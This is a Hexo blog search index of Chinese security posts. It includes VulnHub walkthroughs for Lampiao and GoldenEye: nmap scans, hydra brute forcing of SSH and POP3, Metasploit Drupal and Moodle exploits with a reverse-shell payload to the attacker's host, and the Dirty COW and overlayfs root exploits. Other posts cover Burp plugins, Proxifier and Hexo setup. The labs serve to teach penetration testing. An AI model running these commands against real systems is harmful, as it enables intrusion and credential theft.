<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Lampiao打靶思路</title>
    <link href="/2024/12/16/Lampiao%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/"/>
    <url>/2024/12/16/Lampiao%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>靶机地址：<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p>下载镜像，从Vm打开，给靶机设为NAT模式</p><h3 id="开打"><a href="#开打" class="headerlink" title="开打"></a>开打</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>扫描kali下的整个c段，可以用老方法，先关闭靶机扫一次，再开启扫一次，多的就是靶机</p><p><code>sudo nmap -sn 192.168.200.128/24</code></p><p><img src="/images/Lampiao/1.png"></p><p>我这里是<code>192.168.200.135</code></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap -min-rate 10000 192.168.200.134</code></p><p><img src="/images/Lampiao/2.png"></p><p>可以发现开放了22端口和80端口</p><p>我们访问80端口，发现80端口没东西</p><p><img src="/images/Lampiao/3.png"></p><p>可能还有没扫到的端口</p><p>做一个全端口扫描</p><p><code>nmap -p- 192.168.200.135</code></p><p><img src="/images/Lampiao/4.png"></p><p>确实有一个1898端口</p><p>看看详细信息</p><p><code>sudo nmap -sT -sV -sC -O -p1898 192.168.200.135</code></p><p><img src="/images/Lampiao/5.png"></p><p>可以发现是开放http服务，并且使用的CMS为Drupal，版本为7</p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>通过搜索可知Drupal 7存在CVE-2018-7600</p><p>我们看看MSF有没有历史漏洞</p><p><code>search Drupal</code></p><p><img src="/images/Lampiao/6.png"></p><p>第二条是2018年的</p><p><code>use 1</code></p><p><code>show options</code></p><p><img src="/images/Lampiao/7.png"></p><p><code>set rhosts 192.168.200.135</code></p><p><code>set rport 1898</code></p><p>targeturi选择，在一般的Drupal CVE-2018-7600中使用的是<code>/user/register</code></p><p>而我们这里要使用<code>/?q=user/register</code>，在主页面点击Create new account即可发现</p><p><img src="/images/Lampiao/8.png"></p><p><code>set targeturi /?q=user/register </code></p><p><img src="/images/Lampiao/9.png"></p><p><code>run</code></p><p><img src="/images/Lampiao/11.png"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>上传探针到&#x2F;tmp目录</p><p><img src="/images/Lampiao/10.png"></p><p><code>shell</code></p><p><code>cd /tmp</code>进入&#x2F;tmp目录</p><p><code>ls -l </code>查看文件权限</p><p><code>chmod +x 1.sh</code>  给权限</p><p><code>./1.sh</code>  运行脚本</p><p><img src="/images/Lampiao/12.png"></p><p>发现存在脏牛提权</p><p><img src="/images/Lampiao/13.png"></p><p>下载exp：<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>先退出shell </p><p>上传cow.cpp</p><p><code>upload cow.cpp /tmp/cow.cpp</code></p><p><img src="/images/Lampiao/14.png"></p><p><code>g++ -Wall -pedantic -o2 -std=c++11 -pthread -o dcow cow.cpp -lutil</code>编译exp<br><code>./dcow</code>执行exp</p><p><img src="/images/Lampiao/15.png"></p><p>root密码被改为<code>dirtyCowFun</code>了</p><p>直接使用ssh登录</p><p><code>ssh root@192.168.200.135</code></p><p><code>cat flag.txt</code></p><p><img src="/images/Lampiao/16.png"></p><p>结束</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Lampiao是一个简单靶场，主要内容就是对CVE-2018-7600的使用和脏牛提权</p><h5 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h5><p>1898端口页面还存在一个普通用户的用户名和密码，在<code>/?q=node/2</code>下可以发现m4a文件里有用户名tiago</p><p><img src="/images/Lampiao/17.png"></p><p>利用cewl生成密码字典</p><p><code>cewl http://192.168.200.135:1898/ -w Lampiao.txt</code></p><p>hydra爆破ssh</p><p><code>hydra -l tiago -P Lampiao.txt 192.168.200.135 ssh</code></p><p><img src="/images/Lampiao/18.png"></p><p>爆破出密码<code>Virgulino</code></p><p><code>ssh tiago@192.168.200.135</code></p><p>成功登入tiago</p><p><img src="/images/Lampiao/19.png"></p>]]></content>
    
    
    <categories>
      
      <category>红队打靶</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GoldenEye打靶思路</title>
    <link href="/2024/12/09/GoldenEye%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/"/>
    <url>/2024/12/09/GoldenEye%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>​好久没打靶了，决定开始练习打靶技巧。</p><h3 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h3><p>靶机地址：<a href="https://www.vulnhub.com/entry/goldeneye-1,240/">GoldenEye：1 ~ VulnHub — GoldenEye: 1 ~ VulnHub</a></p><p>下载镜像，从Vm打开，给靶机设为NAT模式</p><h3 id="开打："><a href="#开打：" class="headerlink" title="开打："></a>开打：</h3><h4 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h4><p>扫描kali下的整个c段，可以用老方法，先关闭靶机扫一次，再开启扫一次，多的就是靶机</p><p><code>sudo nmap -sn 192.168.200.128/24</code></p><p><img src="/images/GoldenEye/1.png"></p><p>发现目标靶机地址：<code>192.168.200.134</code></p><p>访问一下看看</p><p><img src="/images/GoldenEye/2.png"></p><p>没问题</p><h4 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h4><p><code>sudo nmap -min-rate 10000 192.168.200.134</code></p><p><img src="/images/GoldenEye/3.png"></p><p>可以看出开放了25端口和80端口</p><p>进一步扫描这几个端口</p><p><code>sudo nmap -sT -sV -sC -O -p25,80 192.168.200.134</code></p><p><img src="/images/GoldenEye/4.png"></p><p>扫一下这两个端口有没有可用的漏洞</p><p><code>sudo nmap --script=vuln -p25,80 192.168.200.134 </code></p><p><img src="/images/GoldenEye/5.png"></p><h4 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h4><p>先看80端口吧</p><p>就是我们之前访问的地址，全英文，有点难看，直接开沉浸式翻译看一下</p><p><img src="/images/GoldenEye/6.png"></p><p>访问&#x2F;sev-home&#x2F;有一个登录框</p><p><img src="/images/GoldenEye/7.png"></p><p>弱密码爆不出</p><p>我们查看主页有没有信息泄露，有一个terminal.js，看看有什么</p><p><img src="/images/GoldenEye/8.png"></p><p>沉浸式翻译一下</p><p><img src="/images/GoldenEye/9.png"></p><p>可以发现这一有一段话，人名有两个，一个是Boris,另一个为Natalya。</p><p>密码为<code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code></p><p>用HTML编码解码可以得到</p><p><img src="/images/GoldenEye/10.png"></p><p>不过我用沉浸式翻译在翻译的时候好像自己给解码了，密码为InvincibleHack3r。</p><p>用得到的用户名和密码区登录试一试，这两个都不行，然后试试全小写的，boris用户登录成功</p><p><img src="/images/GoldenEye/11.png"></p><p><img src="/images/GoldenEye/12.png"></p><p>看意思是说我们需要使用pop3服务，但是他没有使用默认的110端口运行，我们先找到他们把pop3服务配置到哪里了。</p><p>之前没有扫描全部的端口，我们现在进行全端口扫描</p><p><code>sudo nmap -p- 192.168.200.134</code></p><p><img src="/images/GoldenEye/13.png"></p><p>发现两个新端口55006和55007</p><p>查看这两个端口的详细信息</p><p><code>nmap -sS -sV -T5 -A -p55006,55007 192.168.200.134</code></p><p><code>-sS :使用nmap的 SYN 扫描  </code></p><p><code>-sV :使用nmap的 服务版本 检测 </code></p><p><code>-T :nmap的扫描速度 1-5个级别 </code></p><p><code>-A:启用高级扫描选项</code></p><p><img src="/images/GoldenEye/15.png"></p><p>可以看到就是这两个端口支持pop3服务</p><p>在查看网页的源代码时我们还发现了一段话</p><p><img src="/images/GoldenEye/14.png"></p><p><code>Qualified GoldenEye Network Operator Supervisors: Natalya Boris</code></p><p>也就是说用户名还是这两个</p><h4 id="pop3"><a href="#pop3" class="headerlink" title="pop3"></a>pop3</h4><p>将用户名写入文本中</p><p><code>echo -e &#39;natalya\nboris&#39; &gt; pop3User.txt</code></p><p><img src="/images/GoldenEye/16.png"></p><p>使用hydra爆破密码</p><p><code>hydra -L pop3User.txt -P /usr/share/wordlists/fasttrack.txt 192.168.200.134 -s 55007 pop3</code></p><p>等待几分钟</p><p><img src="/images/GoldenEye/17.png"></p><p><img src="/images/GoldenEye/18.png"></p><p>爆破出natalya的密码为bird，boris的密码为secret1!</p><p>先登录一个看看</p><p><code>nc 192.168.200.134 55007</code> 连接邮箱</p><p><code>user boris</code> 用户名</p><p><code>pass secret1!</code> 密码</p><p><img src="/images/GoldenEye/19.png"></p><p>登录成功</p><p>用<code>list</code>可以查看邮件数量</p><p><img src="/images/GoldenEye/20.png"></p><p>分别使用<code>retr 1~3</code>可以查看邮件内容</p><p><img src="/images/GoldenEye/21.png"></p><p><img src="/images/GoldenEye/22.png"></p><p><img src="/images/GoldenEye/23.png"></p><p>分别翻译一下</p><p><img src="/images/GoldenEye/24.png"></p><p><img src="/images/GoldenEye/25.png"></p><p><img src="/images/GoldenEye/26.png"></p><p>第二封是natalya发来的</p><p>第三封邮件出现一个人名Xenia，并且知道对方把GoldenEye的最终代码藏在服务器根目录的隐藏文件中</p><p>查看另一个人的邮箱</p><p><img src="/images/GoldenEye/27.png"></p><p><img src="/images/GoldenEye/28.png"></p><p><img src="/images/GoldenEye/29.png"></p><p>分别翻译一下</p><p><img src="/images/GoldenEye/30.png"></p><p><img src="/images/GoldenEye/31.png"></p><p>又有用户为Xenia的密码，尝试登录查看邮件发现登录失败，爆破密码也失败。</p><h4 id="继续Web渗透"><a href="#继续Web渗透" class="headerlink" title="继续Web渗透"></a>继续Web渗透</h4><p>尝试按照邮件配置本地域名解析</p><p><code>sudo vim /etc/hosts</code></p><p>在最后添加一行</p><p><code>192.168.200.134 severnaya-station.com</code><br>在kali中的火狐里访问 ：<a href="http://severnaya-station.com/gnocertdir/">http://severnaya-station.com/gnocertdir/</a></p><p><img src="/images/GoldenEye/32.png"></p><p>点击Intro to GoldenEye</p><p><img src="/images/GoldenEye/33.png"></p><p>用之前给的用户名和密码登录试试</p><p><img src="/images/GoldenEye/34.png"></p><p>成功登录Xenia用户</p><p>查看Message，有一条未读信息</p><p><img src="/images/GoldenEye/35.png"></p><p>查看信息内容</p><p><img src="/images/GoldenEye/36.png"></p><p>翻译一下</p><p><img src="/images/GoldenEye/37.png"></p><p>得到一个新的邮件名doak</p><h4 id="回到pop3"><a href="#回到pop3" class="headerlink" title="回到pop3"></a>回到pop3</h4><p>尝试爆破密码</p><p><img src="/images/GoldenEye/38.png"></p><p>成功爆出密码为goat</p><p>依旧登录查看邮件</p><p><img src="/images/GoldenEye/39.png"></p><p>翻译一下</p><p><img src="/images/GoldenEye/40.png"></p><h4 id="回到Web"><a href="#回到Web" class="headerlink" title="回到Web"></a>回到Web</h4><p>登录这个账号密码</p><p><img src="/images/GoldenEye/41.png"></p><p>点击My home,发现右上角有一个隐藏文件</p><p><img src="/images/GoldenEye/42.png"></p><p>下载s3cret.txt</p><p><img src="/images/GoldenEye/43.png"></p><p>打开内容直接翻译一下</p><p><img src="/images/GoldenEye/44.png"></p><p>给了一个图片路径，可能里面有admin用户的密码，大概这个意思。</p><p>访问一下</p><p><img src="/images/GoldenEye/45.png"></p><p>picked up a left access key ,估计密码就在其中，可能是图片隐写。</p><p>用strings查看图片中的字符串</p><p><code>strings命令 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。</code></p><p><img src="/images/GoldenEye/46.png"></p><p>发现一串base64编码的字符 <code>eFdpbnRlcjE5OTV4IQ==</code></p><p>在线解密</p><p><img src="/images/GoldenEye/47.png"></p><p>密码为<code>xWinter1995x!</code></p><p>登录admin用户</p><p><img src="/images/GoldenEye/48.png"></p><p>可以发现这个管理系统名为Moodle，版本为2.2.3</p><p>去搜索历史漏洞可以发现存在rce</p><p><img src="/images/GoldenEye/49.png"></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>上msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>search Moodle<br>查看历史漏洞<br></code></pre></td></tr></table></figure><p><img src="/images/GoldenEye/50.png"></p><p>1为我们需要的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use <span class="hljs-number">1</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span>                      <span class="hljs-comment">---查看需要的参数</span><br><span class="hljs-keyword">set</span> username <span class="hljs-keyword">admin</span>                <span class="hljs-comment">---设置用户名：admin</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> xWinter1995x!        <span class="hljs-comment">---设置密码：xWinter1995x!</span><br><span class="hljs-keyword">set</span> rhost severnaya-station.com   <span class="hljs-comment">---设置：rhosts severnaya-station.com</span><br><span class="hljs-keyword">set</span> targeturi /gnocertdir         <span class="hljs-comment">---设置目录： /gnocertdir</span><br><span class="hljs-keyword">set</span> payload cmd/unix/<span class="hljs-keyword">reverse</span>      <span class="hljs-comment">---设置payload：cmd/unix/reverse</span><br><span class="hljs-keyword">set</span> lhost <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.128</span>          <span class="hljs-comment">---设置：lhost 192.168.200.128，为kali的ip地址</span><br>exploit  <span class="hljs-comment">----执行命令</span><br></code></pre></td></tr></table></figure><p>此时遇到问题，有一个failed，并且别人没碰到过</p><p><img src="/images/GoldenEye/51.png"></p><p>解决方法参考：<a href="https://www.cnblogs.com/hongkejpluo/p/16448851.html">Metasploit（msf）</a></p><p>只需更新msf即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">更新Metasploit<br> 1、apt-<span class="hljs-built_in">get</span> update<br> 2、apt-<span class="hljs-built_in">get</span> install metasploit-framework<br> 3、reboot（重启kali） <br></code></pre></td></tr></table></figure><p>再打一次，正常了</p><p><img src="/images/GoldenEye/52.png"></p><p>还是报错，因为还有页面的配置需要修改，默认使用的是Google Spell,改为PSpellshell，并且save changes</p><p><img src="/images/GoldenEye/53.png"></p><p>再打一次</p><p><img src="/images/GoldenEye/54.png"></p><p>成功了</p><p><strong>或者</strong>可以试试手打exp：<a href="https://www.exploit-db.com/exploits/29324">Moodle - Remote Command Execution (Metasploit) - Linux remote Exploit</a></p><p>shell</p><p><img src="/images/GoldenEye/55.png"></p><p>没权限</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>使用内核提权，<code>uname -a</code> 查看系统版本</p><p><img src="/images/GoldenEye/56.png"></p><p>我们查看上exploit-db.com寻找一下</p><p><img src="/images/GoldenEye/57.png"></p><p>用第二个</p><p>weget下载下来，并且gcc编译</p><p><img src="/images/GoldenEye/58.png"></p><p>没有gcc说是，那我们改用cc吧</p><p><code>cc 是 Unix系统的 C Compiler，一个是古老的 C 编译器。而 Linux 下 cc 一般是一个符号连接，指向 gcc；可以通过 $ ls -l /usr/bin/cc 来简单察看，该变量是 make 程序的内建变量，默认指向 gcc 。 cc 符号链接和变量存在的意义在于源码的移植性，可以方便的用 gcc 来编译老的用cc编译的Unix软件，甚至连 makefile 都不用改在，而且也便于 Linux 程序在 Unix下 编译。</code></p><p>c代码我们也需要修改，因为里面也有gcc</p><p><img src="/images/GoldenEye/59.png"></p><p>先在kali里面修改一下先，重命名exp.c</p><p>在kali当前目录上起个python服务</p><p>靶机上wget一下</p><p><code>wget http://192.168.200.128:8081/exp.c</code></p><p>cc编译一下</p><p><code>cc -o exp exp.c</code></p><p>chmod赋权</p><p><code>chmod +x exp</code></p><p>执行exp</p><p><code>./exp </code></p><p>id查看权限</p><p><img src="/images/GoldenEye/60.png"></p><p>执行命令</p><p><code>ls /root/.*</code>可以发现flag.txt</p><p><code>cat /root/.flag.txt</code></p><p><img src="/images/GoldenEye/61.png"></p><p>得到一个uri，访问就结束了</p><p><img src="/images/GoldenEye/62.png"></p><p>这张图片应该是1995电影<code>007黄金之眼的</code>剧情</p><p>此外还有一串md5:<code>568628e0d993b1973adc718237da6e93</code></p><p>解出来是006</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h4><p>一个很有意思的中等难度靶机</p><h4 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h4><p>学会了hydra(九头蛇)爆破pop3，以及pop3中的user，pass，list，retr命令</p><p>图片隐写，通过strings命令查看隐藏字符串</p><p> Moodle 2.2.3的getshell，不过还是没了解原理，比如为什么改配置为PSpellshell</p><p>linux 3.13.0的提权的方法原理参考：<a href="https://www.cnblogs.com/LittleHann/p/4598120.html">CVE-2015-1328 Ubuntu 12.04, 14.04, 14.10, 15.04 overlayfs Local Root - 郑瀚 - 博客园</a></p><p>不存在gcc时使用cc编译c代码</p>]]></content>
    
    
    <categories>
      
      <category>红队打靶</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bp插件Unicode转中文-knife</title>
    <link href="/2024/11/20/bp%E6%8F%92%E4%BB%B6unicode%E8%BD%AC%E4%B8%AD%E6%96%87/"/>
    <url>/2024/11/20/bp%E6%8F%92%E4%BB%B6unicode%E8%BD%AC%E4%B8%AD%E6%96%87/</url>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>​在重放包测试中，有时会出现返回包为unicode编码的情况</p><p><img src="/images/bp%E6%8F%92%E4%BB%B6knife/1.png"></p><p>这只是只有一句的情况，我们还尚可丢入unicode在线转中文，</p><p><img src="/images/bp%E6%8F%92%E4%BB%B6knife/2.png"></p><p>但是如果需要多次重放包，并且多处unicode的情况，十分不方便。</p><p>所以我们需要在bp装一个unicode转中文的插件，本来是想用U2C插件的，但U2C已经停止更新，并且并入knife项目中，所以这篇文章就选择使用knife。</p><p>U2C:<a href="https://github.com/bit4woo/u2c">Unicode To Chinese – U2C : Unicode编码转中文的burp插件</a></p><p>knife:<a href="https://github.com/bit4woo/knife">knife</a></p><p><img src="/images/bp%E6%8F%92%E4%BB%B6knife/3.png"></p><h4 id="knife安装与u2c功能的使用"><a href="#knife安装与u2c功能的使用" class="headerlink" title="knife安装与u2c功能的使用"></a>knife安装与u2c功能的使用</h4><p>​knife的md文档已经写的很详细了，我尝试使用github actions下载不知为什么无法下载，并且自行打包的方法后，mvn命令执行报错，所以我准备下载release版本(难绷)。</p><p> 下载jar包：<a href="https://github.com/bit4woo/knife/releases">Releases · bit4woo&#x2F;knife</a></p><p><img src="/images/bp%E6%8F%92%E4%BB%B6knife/4.png"></p><p>导入jar包</p><p><img src="/images/bp%E6%8F%92%E4%BB%B6knife/5.png"></p><p>使用u2c功能</p><p><img src="/images/bp%E6%8F%92%E4%BB%B6knife/6.png"></p><h4 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h4><p>​很不错的插件，knife除了这个u2c功能以外还有不少实用功能，可以查看knife的md文件看看。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>burp并发插件TurblIntruder(暂鸽)</title>
    <link href="/2024/11/20/burp%E5%B9%B6%E5%8F%91%E6%8F%92%E4%BB%B6TurboIntruder/"/>
    <url>/2024/11/20/burp%E5%B9%B6%E5%8F%91%E6%8F%92%E4%BB%B6TurboIntruder/</url>
    
    <content type="html"><![CDATA[<p>可参考：<a href="https://sanshiok.com/archive/16.html#">保姆级并发教程（Turbo Intruder）</a></p><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>并发测试作为一个大力出奇迹的操作，在漏洞挖掘中也是非常常见，刚好bp的TurboIntruder插件也在测试并发漏洞中使用的比较多，所以介绍一下此插件。</p><p><img src="/images/TurboIntruder/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Proxifier+bp抓小程序包以及可能遇到的问题</title>
    <link href="/2024/11/12/Proxifier+bp%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E5%8F%8A%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/11/12/Proxifier+bp%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8C%85%E5%8F%8A%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>​没事捣鼓一下小程序抓包,本文默认已经熟练bp，如需要安装bp的教程请自行查找。</p><h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><h4 id="Proxifier安装："><a href="#Proxifier安装：" class="headerlink" title="Proxifier安装："></a>Proxifier安装：</h4><p>​在官网下载或者下载汉化版<strong>Proxifier</strong>,安装只有两个选项，一个是选择保存位置，另一个是是否创建快捷方式，根据自己的喜好自行决定，其余全部点击next，最后finish。</p><h4 id="Proxifier配置："><a href="#Proxifier配置：" class="headerlink" title="Proxifier配置："></a>Proxifier配置：</h4><p>点击主界面的配置文件-》代理服务器</p><p><img src="/images/Proxifier/1.png"></p><p>代理服务器配置如下，端口号可自行选择</p><p><img src="/images/Proxifier/2.png"></p><p>配置代理规则</p><p><img src="/images/Proxifier/3.png"></p><p>添加一个如下配置</p><p><img src="/images/Proxifier/4.png"></p><p>启动http代理服务器支持</p><p><img src="/images/Proxifier/5.png"></p><p><img src="/images/Proxifier/6.png"></p><h4 id="bp配置："><a href="#bp配置：" class="headerlink" title="bp配置："></a>bp配置：</h4><p>配置bp的代理</p><p><img src="/images/Proxifier/7.png"></p><p>添加一个Proxy，要与Proxifier代理服务器配置的端口一样</p><p><img src="/images/Proxifier/8.png"></p><p>访问localhost:9870或你自选的端口</p><p>点击CA Certificate，下载证书，遇到拦截点击保存</p><p><img src="/images/Proxifier/9.png"></p><p>打开证书安装</p><p><img src="/images/Proxifier/10.png"></p><p>在证书储存位置选择如上配置，其他的都点击下一步直至安装成功即可。</p><h4 id="抓包："><a href="#抓包：" class="headerlink" title="抓包："></a>抓包：</h4><p>打开微信小程序，再打开bp的抓包功能</p><p><img src="/images/Proxifier/11.png"></p><p>抓取到了美团小程序的包</p><h4 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h4><p>可能配置后小程序连不上网，大概率是安装证书出了问题，没有按我如上配置安装(之前就是一直连不上网，这样配置后就行了)</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>又学会了一个工具，确实挺不错的</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo添加美化插件</title>
    <link href="/2024/11/12/hexo%E6%B7%BB%E5%8A%A0%E7%BE%8E%E5%8C%96%E6%8F%92%E4%BB%B6/"/>
    <url>/2024/11/12/hexo%E6%B7%BB%E5%8A%A0%E7%BE%8E%E5%8C%96%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="后后记"><a href="#后后记" class="headerlink" title="后后记"></a>后后记</h2><p>如果网页能展示人数，但是一直为0不增加可能是web_analytics没有打开，网上找了半天都没找到，读半天配置找到了</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/16.png"></p><p>这波纯属闹贪了(还找了半天，差点就换busuanzi了)</p><h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><p>使用leanCloud查看人数还是有问题，推荐使用leanCloud国际版，不要使用大陆版，在下图添加一个API域名绑定，如果使用中国大陆版则要求域名备案，很麻烦，推荐使用国际版。</p><p>在域名服务商那里添加一个类似我这样的域名解析就行</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/14.png"></p><p>然后再config设置，把两个serverURLs的的设置都改为你绑定API的域名。</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/15.png"></p><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>没事做想给hexo美化一下，加个评论和访问人数。</p><h4 id="1-添加评论功能："><a href="#1-添加评论功能：" class="headerlink" title="1.添加评论功能："></a>1.添加评论功能：</h4><p>使用Valine软件，也是我使用的Fluid支持的。</p><p>在leanCloud上注册一个账号 <a href="https://console.leancloud.cn/register">注册 · LeanCloud</a></p><p>查看邮件验证邮箱，支付宝实名认证</p><p>创建应用</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/1.png"></p><p>个人版创建</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/2.png"></p><p>创建成功，进入应用</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/3.png"></p><p>选择左下角的设置&gt;应用凭证，然后就能看到你的<code>APP ID</code>,<code>APP Key</code>,<code>服务器地址</code>了</p><p>在安全中心可以设置安全域名，防止别人看见你的id和key后直接使用你的</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/4.png"></p><p><strong>hexo-fluid添加valine评论记录</strong></p><p>修改fluid主题配置文件(_config.fluid.yml)</p><p>找到comments配置，将enable的值改为true，type的值改为valine</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/5.png"></p><p>往下滑，找到valine的配置</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/6.png"></p><p>把appId,appKey,和serverURLs插入对应位置</p><p>hexo clean</p><p>hexo g</p><p>hexo s</p><p>本地看看配置好了没</p><p>效果图</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/7.png"></p><p>这样就配置好了，还可以自己改一些别的参数</p><p>评论全在leanCloud上管理</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/8.png"></p><h4 id="2-添加查看人数"><a href="#2-添加查看人数" class="headerlink" title="2.添加查看人数"></a>2.添加查看人数</h4><p>打开fluid主题配置文件(_config.fluid.yml)</p><p>搜索页脚</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/9.png"></p><p>enable设置为true，source设置为”leancloud”，再加上总访问人数和总访客量</p><p><strong>设置每个文章单独的访问量统计</strong></p><p>搜索views，把enable设为true，source设置为”leancloud”</p><p>加上一句<code>format:&quot;&#123;&#125;次&quot;</code></p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/10.png"></p><p>搜索leancloud添加配置，和上面的一样的参数</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/11.png"></p><p>hexo clean</p><p>hexo g</p><p>hexo s 一套小连招看看本地运行效果</p><p>主页效果</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/12.png"></p><p>文章下的效果</p><p><img src="/images/hexo%E7%BE%8E%E5%8C%96/13.png"></p><p>所有的效果也可以根据自己的喜好修改</p><h4 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h4><p>确实挺不错的</p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GitHacker工具</title>
    <link href="/2024/10/27/GitHacker%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/10/27/GitHacker%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>遇到了写一下</p><h4 id="GitHacker"><a href="#GitHacker" class="headerlink" title="GitHacker:"></a>GitHacker:</h4><p>下载地址<a href="https://github.com/WangYihang/GitHacker">WangYihang&#x2F;GitHacker</a></p><p>下载好后再GitHacker目录下的命令行执行</p><p><code>python -m pip install -i https://pypi.org/simple/ GitHacker</code></p><p><img src="/images/GitHacker/1.png"></p><p>安装好环境后，尝试执行命令<code>githacker</code>或<code>githacker -h</code>，看看能不能行</p><p><img src="/images/GitHacker/2.png"></p><p>常用命令<code>--url</code>，<code>--output-folder</code></p><h4 id="do"><a href="#do" class="headerlink" title="do"></a>do</h4><p><strong>Shctf [Week1] ez_gittt</strong></p><p>执行命令<code>githacker --url http://xxxx/.git --output-folder shctf</code></p><p>获得文件shctf</p><p>打开文件，打开cmd，执行<code>git log</code></p><p><img src="/images/GitHacker/3.png"></p><p>可以看到有<code>add flag</code> 和<code>remove flag</code></p><p>使用命令<code>git diff + 版本commit</code>，查看信息改动，获得flag</p><p><img src="/images/GitHacker/4.png"></p><h4 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h4><p>确实挺不错的</p>]]></content>
    
    
